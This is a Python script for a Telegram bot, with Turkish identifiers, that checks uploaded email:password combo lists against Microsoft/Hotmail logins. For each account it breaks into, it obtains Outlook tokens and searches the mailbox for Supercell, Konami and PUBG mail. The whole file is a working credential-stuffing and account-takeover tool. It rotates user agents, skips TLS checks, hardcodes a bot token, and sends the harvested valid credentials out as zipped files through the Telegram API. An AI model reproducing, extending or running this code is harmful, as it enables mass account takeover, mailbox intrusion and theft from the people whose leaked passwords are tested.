import sys, os, re, json, time, random, threading, requests, zipfile
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from email.utils import parsedate_to_datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8909703399:AAEWG74XTj5YMz2DErs-2v2Ok5X7gSFt1Wc"

THREAD_COUNT = 1
multi_bekleyen = {}
tarama_durdur = {}

HITS_FILE = "hotmailbothits.txt"
SUPERCELL_HITS_FILE = "supercellbothits.txt"
KONAMI_HITS_FILE = "konamibothits.txt"
PUBG_HITS_FILE = "pubgbothits.txt"
TWOFA_FILE = "checkerbot2FA.txt"
ZIP_FILE = "hotmailsupercellchecker.zip"

def sarhosoldumbugun(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"

def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd and "@" in email:
                return f"{email}:{pwd}"
    return None

def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya:
            continue
        if not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    benzersiz = list(dict.fromkeys(tum_hesaplar))
    return benzersiz

batmanparkyetkilisi = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def ataturkparki():
    return random.choice(batmanparkyetkilisi)

class marazali:
    REQ = 25

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.s = self.toyotacorollabest()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.cid = ""
        self.gelsinhayatbildigigibi = None
        self.bilmemhangiruzgaratti = None
        self.sahteparantezleracmasakin = (
            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )

    def toyotacorollabest(self):
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        return s

    def nihathatipoglu(self, tag):
        try:
            h = {
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
            text = r.text
            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
                 or re.search(r'value="(.+?)"', text, re.S)
                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
            if not m:
                return "BAD"
            sFTTag = m.group(1)
            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
                  or re.search(r"urlPost:'(.+?)'", text, re.S)
                  or re.search(r'urlPost:"(.+?)"', text, re.S)
                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
            if not m2:
                return "BAD"
            urlPost = m2.group(1).replace("&amp;", "&")
            data = {
                "login": self.email,
                "loginfmt": self.email,
                "passwd": self.password,
                "PPFT": sFTTag
            }
            h2 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }
            r2 = self.s.post(urlPost, data=data, headers=h2,
                             allow_redirects=True, timeout=self.REQ, verify=False)
            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                if token != "None":
                    self.gelsinhayatbildigigibi = token
                    return "SUCCESS"
            if "cancel?mkt=" in r2.text:
                try:
                    kotukardesim = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
                    oyleeeemi = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
                    hmmm = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
                    if kotukardesim and oyleeeemi and hmmm:
                        dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                        if action:
                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
                                              allow_redirects=True, timeout=self.REQ, verify=False)
                            kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if kurmancihergulee:
                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
                                                 timeout=self.REQ, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                if token != "None":
                                    self.gelsinhayatbildigigibi = token
                                    return "SUCCESS"
                except:
                    pass
            if any(v in r2.text for v in [
                "recover?mkt", "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"
            ]):
                return "2FA"
            fatihterim = r2.text.lower()
            if any(v in fatihterim for v in [
                "password is incorrect", "account doesn't exist",
                "that microsoft account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
                "help us protect your account", "your account or password is incorrect"
            ]):
                return "BAD"
            return "BAD"
        except:
            return "ERROR"

    def kimseyisevemem(self, tag):
        try:
            self.sahteparantezleracmasakin = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=00000000402B5328"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            h = {"User-Agent": ataturkparki()}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.gelsinhayatbildigigibi = tok
                    return tok
            self.soyleyememyeminederim = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.bilmemhangiruzgaratti = tok
                    return tok
            return None
        except:
            return None

    def ahhhelerimtitriyor(self, tag):
        try:
            pikniksararbugunlerde = self.s.cookies.get("MSPCID", "")
            if pikniksararbugunlerde:
                self.cid = pikniksararbugunlerde.upper()
                return True
            ofbiratesbasiyor = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
            if ofbiratesbasiyor:
                self.cid = ofbiratesbasiyor.group(1).upper()
                return True
            self.cid = self.email.upper().replace("@", "").replace(".", "")
            return True
        except:
            return False

    def search_messages(self, tag, query, token):
        """Belirli bir kelime için mesaj sayısı ve son tarihi bul"""
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
            body = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": 500,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": query},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
            }
            r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                
                total = 0
                son_tarih = None
                
                for es in data.get("EntitySets", []):
                    if es.get("Total") is not None:
                        total = es.get("Total", 0)
                        break
                
                for es in data.get("EntitySets", []):
                    results = es.get("Results", [])
                    if results:
                        first_result = results[0]
                        date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
                        if date_str:
                            try:
                                son_tarih = parsedate_to_datetime(date_str)
                            except:
                                pass
                        break
                
                if total == 0:
                    total_match = re.search(r'"Total":\s*(\d+)', r.text)
                    if total_match:
                        total = int(total_match.group(1))
                
                return total, son_tarih
            
            return 0, None
        except:
            return 0, None

    def check(self, tag):
        status = self.nihathatipoglu(tag)
        if status != "SUCCESS":
            return status, None
        self.ahhhelerimtitriyor(tag)
        token = self.kimseyisevemem(tag)
        if not token:
            return "BAD", None
        
        time.sleep(2)
        
        # Supercell mesajları
        sc_sayisi, sc_tarih = self.search_messages(tag, "Supercell", token)
        time.sleep(1)
        
        # Konami mesajları
        konami_sayisi, konami_tarih = self.search_messages(tag, "Konami", token)
        time.sleep(1)
        
        # PUBG mesajları
        pubg_sayisi, pubg_tarih = self.search_messages(tag, "PUBG", token)
        
        mesaj_info = {
            'supercell': {
                'sayi': sc_sayisi,
                'tarih': sc_tarih.strftime('%Y-%m-%d %H:%M:%S') if sc_tarih else 'N/A'
            },
            'konami': {
                'sayi': konami_sayisi,
                'tarih': konami_tarih.strftime('%Y-%m-%d %H:%M:%S') if konami_tarih else 'N/A'
            },
            'pubg': {
                'sayi': pubg_sayisi,
                'tarih': pubg_tarih.strftime('%Y-%m-%d %H:%M:%S') if pubg_tarih else 'N/A'
            }
        }
        
        return "SUCCESS", mesaj_info

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass

def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass

def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        content = requests.get(file_url, timeout=30).text
        return content
    except:
        return None

def create_zip():
    """Tüm hit dosyalarını zip'le"""
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in [HITS_FILE, SUPERCELL_HITS_FILE, KONAMI_HITS_FILE, PUBG_HITS_FILE, TWOFA_FILE]:
                if os.path.exists(f) and os.path.getsize(f) > 0:
                    zf.write(f, os.path.basename(f))
        return True
    except:
        return False

def ana_menu(chat_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Başlat", "callback_data": "baslat"}],
            [{"text": "⚡ Thread Ayarları", "callback_data": "thread_menu"}],
            [{"text": "📂 Multi Tarama", "callback_data": "multi_start"}],
            [{"text": "📊 Durum", "callback_data": "durum"}]
        ]
    }
    send_message(chat_id, "🤖 <b>Hotmail Multi-Game Checker Bot</b>\n\nSupercell + Konami + PUBG mesaj kontrolü\n\nSeçenek seç:", keyboard)

def thread_menu(chat_id):
    global THREAD_COUNT
    keyboard = {
        "inline_keyboard": [
            [{"text": "1 Thread (Yavaş)", "callback_data": "thread_1"},
             {"text": "2 Thread", "callback_data": "thread_2"}],
            [{"text": "3 Thread", "callback_data": "thread_3"},
             {"text": "4 Thread", "callback_data": "thread_4"}],
            [{"text": "5 Thread (Hızlı)", "callback_data": "thread_5"}],
            [{"text": "🔙 Ana Menü", "callback_data": "main_menu"}]
        ]
    }
    send_message(chat_id, f"⚡ <b>Thread Ayarları</b>\n\nŞu anki: {THREAD_COUNT} Thread\n\nSeçim yap:", keyboard)

def benferooolum():
    for f in [HITS_FILE, SUPERCELL_HITS_FILE, KONAMI_HITS_FILE, PUBG_HITS_FILE, TWOFA_FILE]:
        with open(f, 'w', encoding='utf-8') as fh:
            pass

def tarama_yap(chat_id, accounts, dosya_adi):
    global THREAD_COUNT
    benferooolum()
    dogrudogru = len(accounts)
    babasarkikalmadi = time.time()
    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0, "supercell_hits": 0, "konami_hits": 0, "pubg_hits": 0}
    lock = threading.Lock()
    semaphore = threading.BoundedSemaphore(THREAD_COUNT)
    tarama_durdur[chat_id] = False

    sent = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": chat_id, "text": "📊 Tarama başlıyor..."}, timeout=15).json()
    progress_message_id = sent["result"]["message_id"] if sent.get("ok") else None

    def check_one(combo):
        nonlocal egriegri
        try:
            if tarama_durdur.get(chat_id, False):
                semaphore.release()
                return
            email, password = combo.split(":", 1)
            tag = email.split("@")[0][:12]
            c = marazali(email, password, None)
            status, mesaj_info = c.check(tag)
            with lock:
                if status == "SUCCESS":
                    egriegri["hit"] += 1
                    
                    sc_sayi = mesaj_info.get('supercell', {}).get('sayi', 0) if mesaj_info else 0
                    konami_sayi = mesaj_info.get('konami', {}).get('sayi', 0) if mesaj_info else 0
                    pubg_sayi = mesaj_info.get('pubg', {}).get('sayi', 0) if mesaj_info else 0
                    
                    sc_tarih = mesaj_info.get('supercell', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
                    konami_tarih = mesaj_info.get('konami', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
                    pubg_tarih = mesaj_info.get('pubg', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
                    
                    # Normal hit - her zaman yaz
                    normal_hit = f"{combo}"
                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
                        f.write(normal_hit + "\n")
                    
                    # Supercell hit
                    if sc_sayi > 0:
                        egriegri["supercell_hits"] += 1
                        sc_line = f"{combo} | Supercell Mesaj: {sc_sayi} | Son Mesaj: {sc_tarih}"
                        with open(SUPERCELL_HITS_FILE, 'a', encoding='utf-8') as f:
                            f.write(sc_line + "\n")
                        print(f"✅ SUPERCELL {sc_line}", flush=True)
                    
                    # Konami hit
                    if konami_sayi > 0:
                        egriegri["konami_hits"] += 1
                        konami_line = f"{combo} | Konami Mesaj: {konami_sayi} | Son Mesaj: {konami_tarih}"
                        with open(KONAMI_HITS_FILE, 'a', encoding='utf-8') as f:
                            f.write(konami_line + "\n")
                        print(f"✅ KONAMI {konami_line}", flush=True)
                    
                    # PUBG hit
                    if pubg_sayi > 0:
                        egriegri["pubg_hits"] += 1
                        pubg_line = f"{combo} | PUBG Mesaj: {pubg_sayi} | Son Mesaj: {pubg_tarih}"
                        with open(PUBG_HITS_FILE, 'a', encoding='utf-8') as f:
                            f.write(pubg_line + "\n")
                        print(f"✅ PUBG {pubg_line}", flush=True)
                    
                    if sc_sayi == 0 and konami_sayi == 0 and pubg_sayi == 0:
                        print(f"✅ HİT {combo} | Oyun mesajı yok", flush=True)
                
                elif status == "2FA":
                    egriegri["twofa"] += 1
                    with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
                        f.write(combo + "\n")
                    print(f"🔐 2FA {combo}", flush=True)
                else:
                    egriegri["bad"] += 1
                    print(f"❌ BAD {combo}", flush=True)
        except Exception as e:
            with lock:
                egriegri["errors"] += 1
            print(f"⚠️ ERROR {combo} {str(e)}", flush=True)
        finally:
            with lock:
                egriegri["checked"] += 1
            semaphore.release()

    def progress_updater():
        nonlocal egriegri, dogrudogru, babasarkikalmadi
        while egriegri["checked"] < dogrudogru:
            time.sleep(3)
            if tarama_durdur.get(chat_id, False):
                break
            with lock:
                checked = egriegri["checked"]
                hit = egriegri["hit"]
                sc = egriegri["supercell_hits"]
                konami = egriegri["konami_hits"]
                pubg = egriegri["pubg_hits"]
                twofa = egriegri["twofa"]
                bad = egriegri["bad"]
                errors = egriegri["errors"]
            total = dogrudogru
            elapsed = time.time() - babasarkikalmadi
            yuzde = (checked / total) * 100 if total > 0 else 0
            cpm = (checked / elapsed) * 60 if elapsed > 0 else 0
            filled = int(20 * checked // total) if total > 0 else 0
            bar = '█' * filled + '░' * (20 - filled)
            mesaj = (
                f"📊 <b>Tarama Devam Ediyor</b>\n\n"
                f"📁 Dosya: <code>{dosya_adi}</code>\n"
                f"⚡ Thread: {THREAD_COUNT}\n"
                f"📊 İlerleme: {checked}/{total} (%{yuzde:.1f})\n"
                f"{bar}\n\n"
                f"✅ HIT: {hit}\n"
                f"🎮 SUPERCELL: {sc}\n"
                f"🕹️ KONAMI: {konami}\n"
                f"🔫 PUBG: {pubg}\n"
                f"🔐 2FA: {twofa}\n"
                f"❌ BAD: {bad}\n"
                f"⚠️ HATA: {errors}\n\n"
                f"⏰ Geçen: {int(elapsed)}s\n"
                f"⚡ CPM: {int(cpm)}"
            )
            if progress_message_id:
                try:
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                                  data={"chat_id": chat_id, "message_id": progress_message_id, "text": mesaj}, timeout=15)
                except:
                    pass

    updater = threading.Thread(target=progress_updater, daemon=True)
    updater.start()

    threads = []
    for combo in accounts:
        if tarama_durdur.get(chat_id, False):
            break
        semaphore.acquire()
        t = threading.Thread(target=check_one, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - babasarkikalmadi
    durdu = tarama_durdur.get(chat_id, False)
    
    # ZIP oluştur
    zip_olustu = create_zip()
    
    stats = (
        f"{'⏹️ Tarama durduruldu' if durdu else '✅ Tarama tamamlandı'} ({elapsed:.1f} sn)\n\n"
        f"🔱 Toplam: {dogrudogru}\n"
        f"✅ Hit: {egriegri['hit']}\n"
        f"🎮 Supercell: {egriegri['supercell_hits']}\n"
        f"🕹️ Konami: {egriegri['konami_hits']}\n"
        f"🔫 PUBG: {egriegri['pubg_hits']}\n"
        f"❌ Bad: {egriegri['bad']}\n"
        f"🔐 2FA: {egriegri['twofa']}\n"
        f"⚠️ Hata: {egriegri['errors']}"
    )
    send_message(chat_id, stats)
    
    # ZIP dosyasını gönder
    if zip_olustu:
        send_document(chat_id, ZIP_FILE)
    else:
        # ZIP olmadıysa ayrı ayrı gönder
        if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
            send_document(chat_id, HITS_FILE)
        if os.path.exists(SUPERCELL_HITS_FILE) and os.path.getsize(SUPERCELL_HITS_FILE) > 0:
            send_document(chat_id, SUPERCELL_HITS_FILE)
        if os.path.exists(KONAMI_HITS_FILE) and os.path.getsize(KONAMI_HITS_FILE) > 0:
            send_document(chat_id, KONAMI_HITS_FILE)
        if os.path.exists(PUBG_HITS_FILE) and os.path.getsize(PUBG_HITS_FILE) > 0:
            send_document(chat_id, PUBG_HITS_FILE)

def telegram_bot():
    global offset, THREAD_COUNT
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            if data.get("ok"):
                for update in data.get("result", []):
                    offset = update["update_id"] + 1
                    if "callback_query" in update:
                        cb = update["callback_query"]
                        chat_id = cb["message"]["chat"]["id"]
                        data_cb = cb["data"]
                        if data_cb == "main_menu":
                            ana_menu(chat_id)
                        elif data_cb == "thread_menu":
                            thread_menu(chat_id)
                        elif data_cb == "baslat":
                            send_message(chat_id, "📂 Combo dosyanı gönder. Tarama otomatik başlayacak. Durdurmak için /stop yaz.")
                        elif data_cb == "multi_start":
                            send_message(chat_id, "📂 Combo dosyalarını gönder. Bitince /bitti yaz. Durdurmak için /stop yaz.")
                            multi_bekleyen[chat_id] = []
                        elif data_cb == "durum":
                            send_message(chat_id, f"✅ Bot aktif.\n⚡ Thread: {THREAD_COUNT}")
                        elif data_cb.startswith("thread_"):
                            THREAD_COUNT = int(data_cb.split("_")[1])
                            send_message(chat_id, f"✅ Thread sayısı {THREAD_COUNT} olarak ayarlandı.")
                            ana_menu(chat_id)
                        continue
                    if "message" not in update:
                        continue
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    if "document" in msg:
                        file_id = msg["document"]["file_id"]
                        file_name = msg["document"].get("file_name", "combo.txt")
                        if chat_id in multi_bekleyen:
                            multi_bekleyen[chat_id].append((file_id, file_name))
                            send_message(chat_id, f"📂 {file_name} eklendi. Toplam: {len(multi_bekleyen[chat_id])} dosya. Bitince /bitti yaz.")
                        else:
                            send_message(chat_id, "📂 Combo alındı, indiriliyor...")
                            content = download_file(file_id)
                            if content is None:
                                send_message(chat_id, "❌ Dosya indirilemedi.")
                                continue
                            with open("uploaded_combo.txt", "w", encoding="utf-8") as f:
                                f.write(content)
                            accounts = cokludosyayukle(["uploaded_combo.txt"])
                            if not accounts:
                                send_message(chat_id, "❌ Geçerli hesap bulunamadı.")
                                continue
                            send_message(chat_id, f"🔱 {len(accounts)} hesap bulundu. Tarama başladı...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, accounts, file_name), daemon=True)
                            t.start()
                    elif msg.get("text") == "/start":
                        ana_menu(chat_id)
                    elif msg.get("text") == "/stop":
                        tarama_durdur[chat_id] = True
                        send_message(chat_id, "⏹️ Tarama durduruluyor... Sonuçlar birazdan gönderilecek.")
                    elif msg.get("text") == "/bitti":
                        if chat_id in multi_bekleyen and multi_bekleyen[chat_id]:
                            send_message(chat_id, "📂 Tüm dosyalar indiriliyor ve birleştiriliyor...")
                            tum_hesaplar = []
                            for fid, fname in multi_bekleyen[chat_id]:
                                content = download_file(fid)
                                if content:
                                    with open(f"multi_{fid}.txt", "w", encoding="utf-8") as f:
                                        f.write(content)
                                    hesaplar = cokludosyayukle([f"multi_{fid}.txt"])
                                    tum_hesaplar.extend(hesaplar)
                            benzersiz = list(dict.fromkeys(tum_hesaplar))
                            send_message(chat_id, f"🔱 Toplam {len(benzersiz)} benzersiz hesap bulundu. Tarama başladı...")
                            t = threading.Thread(target=tarama_yap, args=(chat_id, benzersiz, "multi_combo"), daemon=True)
                            t.start()
                            del multi_bekleyen[chat_id]
                        else:
                            send_message(chat_id, "❌ Önce multi tarama başlatmalısın. Menüden Multi Tarama seç.")
                    elif msg.get("text") == "/thread":
                        thread_menu(chat_id)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    print("Bot başlatıldı...")
    telegram_bot()
